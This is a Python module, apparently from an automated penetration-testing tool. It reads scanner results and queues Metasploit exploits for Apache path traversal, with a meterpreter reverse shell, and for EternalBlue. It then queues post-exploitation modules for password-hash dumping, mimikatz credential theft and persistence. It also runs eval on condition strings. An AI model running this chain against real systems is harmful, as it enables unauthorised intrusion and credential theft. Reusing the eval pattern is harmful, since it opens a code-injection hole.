import logging
import re
from typing import Any, Dict, List

from .database import load_state, save_state

logger = logging.getLogger(__name__)


def _payload(item: Dict[str, Any]) -> Dict[str, Any]:
    """Accept nested {result:...} or flat wrapper dicts."""
    if not isinstance(item, dict):
        return {}
    nested = item.get("result")
    if isinstance(nested, dict):
        return nested
    return item


class DecisionEngine:
    def __init__(self, target: str, job_id: str | None = None):
        self.target = target
        self.job_id = job_id
        self.state = load_state(target, job_id=job_id) or {}
        self.results_cache = {}
        self._fired_actions: set[str] = set(self.state.get("fired_actions") or [])

    def evaluate_phase(self, phase_name: str, phase_results: List[Dict]) -> Dict[str, Any]:
        """Process results of a completed phase and update state."""
        if isinstance(phase_results, dict):
            phase_results = [phase_results]
        self.results_cache[phase_name] = phase_results or []

        for item in phase_results or []:
            if not isinstance(item, dict):
                continue
            tool = item.get("tool") or _payload(item).get("tool")
            if tool == "nuclei":
                self._process_nuclei_results(item)
            elif tool == "nikto":
                self._process_nikto_results(item)
            elif tool == "metasploit":
                self._process_metasploit_results(item)
            elif tool == "sqlmap":
                self._process_sqlmap_results(item)
            elif tool == "nmap":
                self._process_nmap_results(item)
            elif tool == "gobuster":
                self._process_gobuster_results(item)
            elif tool == "ffuf":
                self._process_ffuf_results(item)

        save_state(self.target, self.state, job_id=self.job_id)
        return self.state

    def _process_nuclei_results(self, item):
        result = _payload(item)
        findings = result.get("findings", [])
        vulns = []
        for finding in findings:
            title = finding.get("title", "")
            if "CVE" in title:
                cve_match = re.search(r"CVE-\d{4}-\d+", title)
                if cve_match:
                    vulns.append(
                        {
                            "cve": cve_match.group(0),
                            "severity": finding.get("severity", "unknown"),
                            "title": title,
                        }
                    )
        if vulns:
            self.state.setdefault("vulnerabilities", []).extend(vulns)
            self.state["vuln_found"] = True

    def _process_nikto_results(self, item):
        result = _payload(item)
        issues = result.get("issues", [])
        if issues:
            self.state.setdefault("nikto_issues", []).extend(issues)
            self.state["vuln_found"] = True

    def _process_metasploit_results(self, item):
        result = _payload(item)
        sessions = result.get("sessions", [])
        if sessions:
            self.state.setdefault("sessions", []).extend(sessions)
            self.state["has_session"] = True
        if result.get("vulnerable"):
            self.state["vuln_found"] = True

    def _process_sqlmap_results(self, item):
        result = _payload(item)
        if result.get("vulnerable"):
            self.state["sql_injection"] = True
            self.state["vuln_found"] = True

    def _process_nmap_results(self, item):
        result = _payload(item)
        ports = result.get("ports", [])
        if ports:
            self.state.setdefault("open_ports", []).extend(ports)

    def _process_gobuster_results(self, item):
        result = _payload(item)
        dirs = result.get("directories", [])
        if dirs:
            self.state.setdefault("directories", []).extend(dirs)

    def _process_ffuf_results(self, item):
        result = _payload(item)
        finds = result.get("results", [])
        if finds:
            self.state.setdefault("ffuf_finds", []).extend(finds)

    def decide_next_phase(self, playbook_phases: List[Dict]) -> List[Dict]:
        """Given the playbook phases, decide which to run based on current state."""
        return [phase for phase in playbook_phases if self.should_run_phase(phase)[0]]

    def should_run_phase(self, phase: dict) -> tuple[bool, str | None]:
        """Return whether a playbook phase can run and its skip reason."""
        when_cond = phase.get("when")
        if when_cond and not self._evaluate_condition(when_cond):
            return False, f"condition not met: {when_cond}"

        for dep in phase.get("depends_on", []):
            dep_results = self.results_cache.get(dep)
            if dep_results and all(_payload(item).get("error") for item in dep_results):
                logger.warning(
                    "Skipping phase %s because dependency %s failed",
                    phase.get("name"),
                    dep,
                )
                return False, f"dependency {dep} failed"

        return True, None

    def _evaluate_condition(self, condition: str) -> bool:
        """Evaluate a condition string against the current state."""
        try:
            # Simple evaluator: replace known state keys with their values
            expr = condition
            for key, value in self.state.items():
                if isinstance(value, (str, int, float, bool)):
                    expr = expr.replace(key, repr(value))
                elif isinstance(value, list):
                    # For list membership, e.g., 'CVE-2021-41773' in vulnerabilities
                    # We'll just check if any element matches the condition? 
                    # For simplicity, we use a basic eval with restricted globals.
                    pass
            # Use eval with safe globals
            allowed = {'True': True, 'False': False, 'None': None}
            return eval(expr, allowed, {})
        except Exception as e:
            logger.error(f"Condition evaluation error: {e}")
            return False

    def generate_post_phase_actions(self, phase_name: str, phase_results: List[Dict]) -> List[Dict]:
        """Generate additional tasks based on phase results."""
        actions = []
        proposed_keys: set[str] = set()
        exploit_modules = {
            "CVE-2021-41773": (
                "exploit/multi/http/apache_path_traversal",
                ["PAYLOAD=linux/x64/meterpreter/reverse_tcp", "LHOST=0.0.0.0"],
            ),
            "CVE-2021-42013": (
                "exploit/multi/http/apache_path_traversal",
                ["PAYLOAD=linux/x64/meterpreter/reverse_tcp", "LHOST=0.0.0.0"],
            ),
            "CVE-2017-0143": ("exploit/windows/smb/ms17_010_eternalblue", []),
            "MS17-010": ("exploit/windows/smb/ms17_010_eternalblue", []),
        }
        if self.state.get("vuln_found"):
            for vuln in self.state.get("vulnerabilities", []):
                cve = vuln.get("cve")
                match = exploit_modules.get(cve)
                if not match:
                    continue
                module, options = match
                key = f"exploit:{cve}:{module}"
                if key in proposed_keys or self._action_fired("exploit", cve, module):
                    continue
                actions.append(
                    {
                        "tool": "metasploit",
                        "phase": "proof_of_impact",
                        "stage": "exploit",
                        "finding_id": cve,
                        "args": [module, *options],
                    }
                )
                proposed_keys.add(key)

        if self.state.get("has_session"):
            post_modules = [
                "post/windows/gather/hashdump",
                "post/windows/gather/credentials/mimikatz",
                "post/windows/manage/persistence_exe",
            ]
            for session in self.state.get("sessions", []):
                session_id = session.get("id") if isinstance(session, dict) else None
                if session_id is None:
                    continue
                for module in post_modules:
                    key = f"post:{session_id}:{module}"
                    if key in proposed_keys or self._action_fired(
                        "post", str(session_id), module
                    ):
                        continue
                    actions.append(
                        {
                            "tool": "metasploit",
                            "phase": "post_exploitation",
                            "stage": "post",
                            "finding_id": str(session_id),
                            "args": [module, f"SESSION={session_id}"],
                        }
                    )
                    proposed_keys.add(key)
        return actions

    def _action_fired(self, stage: str, finding_id: str, module: str) -> bool:
        return f"{stage}:{finding_id}:{module}" in self._fired_actions

    def mark_actions_fired(self, actions: list[dict]) -> None:
        for action in actions:
            key = f"{action.get('stage')}:{action.get('finding_id')}:{action['args'][0]}"
            self._fired_actions.add(key)
        self.state["fired_actions"] = sorted(self._fired_actions)
        save_state(self.target, self.state, job_id=self.job_id)